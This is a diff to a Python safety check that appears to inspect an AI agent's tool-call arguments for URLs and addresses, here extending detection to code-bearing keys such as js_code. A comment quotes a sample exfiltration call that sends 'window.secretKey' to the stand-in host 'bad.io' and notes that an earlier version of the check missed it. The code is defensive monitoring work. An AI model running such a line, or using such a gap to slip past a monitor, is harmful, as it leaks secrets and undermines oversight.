@@ -243,7 +243,23 @@ TOOL_URL_KEYS = {"url", "urls", "uri", "endpoint", "webhook", "webhook_url", "ca
 # Argument names whose value is code a tool runs that is not a shell command (a browser's evaluate, a notebook cell, a
 # sandbox's JavaScript): a full URL written inside it is a request the code will make, checked with the HTTP rules.
 TOOL_CODE_ARG_KEYS = {"script", "code", "js", "javascript", "expression", "function", "source", "snippet", "cell"}
-CODE_URL_RE = re.compile(r"\bhttps?://[^\s'\"<>`\\)]+")
+# A key named for code in a language or as a script (js_code, jsCode, python_code, source_code, code_snippet,
+# script_body), not a code that is a value (zip_code, promo_code, country_code) (v0.1.52, RULE-MINE-03 round 3:
+# execute_script js_code="fetch('bad.io', {body: window.secretKey})" was not read as code).
+_CODE_KEY_LANG_WORDS = {"js", "javascript", "python", "py", "source", "snippet", "script", "exec", "run", "eval",
+                        "shell", "bash", "ts", "typescript", "lua", "ruby", "php", "node"}
+
+
+def _is_code_key(key) -> bool:
+    k = str(key)
+    if k.lower() in TOOL_CODE_ARG_KEYS:
+        return True
+    words = {w.lower() for w in re.split(r"[_\-.\s]|(?<=[a-z0-9])(?=[A-Z])", k) if w}
+    if words & {"js", "javascript", "snippet"}:
+        return True
+    return bool("code" in words and words & _CODE_KEY_LANG_WORDS) or bool(
+        "script" in words and words & {"body", "text", "content", "source", "js", "code"})
+CODE_URL_RE = re.compile(r"\b(?:https?|wss?)://[^\s'\"<>`\\)]+")
 # MCP servers that act on the agent's own machine, not on an outside service.
 TOOL_LOCAL_SERVERS = {"filesystem", "fs", "git", "memory", "sequentialthinking", "sequential-thinking",
                       "sequential_thinking", "time", "everything", "ide"}
@@ -1662,13 +1678,13 @@ def _run_text_addresses(arguments, depth: int = 0) -> list[str]:
     out: list[str] = []
     if depth > 6:
         return out
-    keys = set(TOOL_SHELL_ARG_KEYS) | TOOL_CODE_ARG_KEYS
+    shell_keys = set(TOOL_SHELL_ARG_KEYS)
     items = arguments.items() if isinstance(arguments, dict) else (
         (("", v) for v in arguments) if isinstance(arguments, list) else [])
     for k, v in items:
         if isinstance(v, (dict, list)):
             out.extend(_run_text_addresses(v, depth + 1))
-        elif isinstance(v, str) and str(k).lower() in keys:
+        elif isinstance(v, str) and (str(k).lower() in shell_keys or _is_code_key(k)):
             for m in _RUN_EMAIL_RE.finditer(v):
                 out.append(m.group(0))
             # in code a dotted word outside a string is a name (os.path.join, requests.get), so only strings count
@@ -1882,7 +1898,7 @@ def _tool_code_values(arguments, depth: int = 0) -> list[str]:
         return out
     if isinstance(arguments, dict):
         for k, v in arguments.items():
-            if str(k).lower() in TOOL_CODE_ARG_KEYS and isinstance(v, str) and v.strip():
+            if _is_code_key(k) and isinstance(v, str) and v.strip():
                 out.append(v)
             elif isinstance(v, (dict, list)):
                 out.extend(_tool_code_values(v, depth + 1))
@@ -1915,7 +1931,7 @@ def _tool_code_urls(arguments, out: list[str], depth: int = 0) -> None:
         return
     if isinstance(arguments, dict):
         for k, v in arguments.items():
-            if str(k).lower() in TOOL_CODE_ARG_KEYS and isinstance(v, str):
+            if _is_code_key(k) and isinstance(v, str):
                 for u in CODE_URL_RE.findall(v):
                     u = u.rstrip(".,;:")
                     if u not in out:
